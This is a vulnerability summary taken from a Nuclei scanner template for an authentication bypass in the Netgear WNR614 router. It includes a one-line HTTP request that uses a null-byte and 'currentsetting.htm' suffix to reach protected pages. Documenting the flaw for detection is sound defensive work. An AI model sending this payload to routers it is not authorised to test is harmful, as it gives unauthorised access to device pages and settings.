# Nuclei Template: Netgear WNR614 - Improper Authentication
**Template ID:** netgear-wnr614-auth-bypass
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-200
**Source:** Nuclei Template (`netgear-wnr614-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
A vulnerability in the Netgear WNR614 router permits unauthorized individuals to bypass the authentication. When adding "%00currentsetting.htm" to the the requested url, it will be recognized as passing the authentication.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/RST_status.htm%00currentsetting.htm
```

## References
- https://github.com/Shuanunio/CVE_Requests/blob/main/Netgear/WNR614/assets/image-20241210153405727.png
- https://github.com/Shuanunio/CVE_Requests/blob/main/Netgear/WNR614/ACL%20bypass%20Vulnerability%20in%20Netgear%20WNR614.md
